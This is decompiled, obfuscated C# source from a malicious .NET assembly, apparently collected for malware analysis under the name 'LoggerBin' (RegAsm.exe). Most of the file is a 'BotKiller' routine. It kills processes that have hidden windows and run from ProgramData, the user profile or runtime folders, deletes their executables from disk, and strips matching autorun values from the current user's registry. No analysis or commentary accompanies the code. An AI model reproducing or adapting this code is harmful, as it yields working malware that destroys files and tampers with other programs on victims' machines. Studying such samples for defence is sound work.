// Decompiled with JetBrains decompiler
// Type: gWP.xWv
// Assembly: service-nankasa.com-LoggerBin, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 762D1AAC-A39C-4AEB-81B7-3308162A414F
// Assembly location: C:\Users\darbinis\Desktop\Code analysis\Mallicious skriptai\Atack 09-17\RegAsm.exe

using CWT;
using Microsoft.Win32;
using mWs;
using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

namespace gWP
{
  internal static class xWv
  {
    private static xWv cTw;

    public static void XWr()
    {
      try
      {
        if (!Convert.ToBoolean(VW1.XWr.EnableBotKiller))
        {
          ndL.bx(w4.bx(9880, w4.vY), w4.bx(666, w4.vY), ndL.Ldb);
          return;
        }
      }
      catch
      {
      }
      int num1 = 0;
      foreach (Process process in Process.GetProcesses())
      {
        try
        {
          string fileName = process.MainModule.FileName;
          if (ndy.bx(process.MainModule.FileName, ndy.qdQ))
          {
            if (!Ud4.bx(process.MainWindowHandle, Ud4.Ed6))
            {
              process.Kill();
              ndL.bx(w4.bx(9904, w4.vY), fileName, ndL.Ldi);
              int num2 = 0;
              if (xWv.YTQ() != null)
                goto label_16;
label_12:
              switch (num2)
              {
                default:
                  ndL.bx(w4.bx(9998, w4.vY), fileName, ndL.Ldi);
                  Thread.Sleep(500);
                  File.Delete(fileName);
                  ++num1;
                  continue;
              }
label_16:
              int num3;
              num2 = num3;
              goto label_12;
            }
          }
        }
        catch
        {
        }
      }
      ndL.bx(w4.bx(9880, w4.vY), string.Format(w4.bx(10100, w4.vY), (object) num1), ndL.Ldb);
      int num4 = 0;
      if (xWv.YTQ() != null)
        goto label_7;
label_1:
      switch (num4)
      {
        case 0:
          return;
        default:
          return;
      }
label_7:
      int num5;
      num4 = num5;
      goto label_1;
    }

    private static bool VW1(string _param0)
    {
      bool flag;
      try
      {
        int num1;
        if (_param0.ToLower() == Application.ExecutablePath.ToLower())
          num1 = xWv.YTQ() != null ? 1 : 1;
        else
          goto label_16;
label_5:
        switch (num1)
        {
          case 1:
            flag = false;
            goto label_2;
          default:
            goto label_2;
        }
label_16:
        if (!(_param0.ToLower() == bWY.FullPath.ToLower()))
        {
          if (!((string) xWv.DTi((object) _param0) == pWy.DownloadedFileFullPath.ToLower()))
          {
            if (_param0.ToLower().Contains(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData).ToLower()))
            {
              flag = true;
              goto label_2;
            }
            else if (!_param0.ToLower().Contains(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile).ToLower()))
            {
              if (_param0.ToLower().Contains(w4.bx(10144, w4.vY)))
              {
                flag = true;
                goto label_2;
              }
              else if (((string) xWv.DTi((object) _param0)).Contains(RuntimeEnvironment.GetRuntimeDirectory().ToLower()))
              {
                flag = true;
                goto label_2;
              }
            }
            else
            {
              flag = true;
              goto label_2;
            }
          }
          else
          {
            flag = false;
            goto label_2;
          }
        }
        else
        {
          flag = false;
          num1 = 0;
          if (xWv.YTQ() != null)
          {
            int num2;
            num1 = num2;
            goto label_5;
          }
          else
            goto label_5;
        }
      }
      catch
      {
      }
      return false;
label_2:
      return flag;
    }

    private static bool YW3(string _param0) => ndy.bx(_param0, ndy.vdR);

    private static void hWn(string _param0, string _param1)
    {
      try
      {
        RegistryKey registryKey = (RegistryKey) xWv.sT8((object) Registry.CurrentUser, (object) _param0, true);
        try
        {
          foreach (string valueName in registryKey.GetValueNames())
          {
            if (xWv.pTe((object) xWv.eTO((object) registryKey, (object) valueName).ToString(), (object) _param1))
              registryKey.DeleteValue(valueName);
          }
        }
        finally
        {
          if (registryKey != null)
            xWv.mTp((object) registryKey);
        }
      }
      catch
      {
      }
    }

    [DllImport("user32.dll", EntryPoint = "IsWindowVisible")]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool lWp(IntPtr _param0);

    internal static bool ETq() => xWv.cTw == null;

    internal static xWv YTQ() => xWv.cTw;

    internal static object DTi([In] object obj0) => (object) ((string) obj0).ToLower();

    internal static object sT8([In] object obj0, [In] object obj1, [In] bool obj2) => (object) ((RegistryKey) obj0).OpenSubKey((string) obj1, obj2);

    internal static object eTO([In] object obj0, [In] object obj1) => ((RegistryKey) obj0).GetValue((string) obj1);

    internal static bool pTe([In] object obj0, [In] object obj1) => ((string) obj0).Equals((string) obj1);

    internal static void mTp([In] object obj0) => ((IDisposable) obj0).Dispose();
  }
}
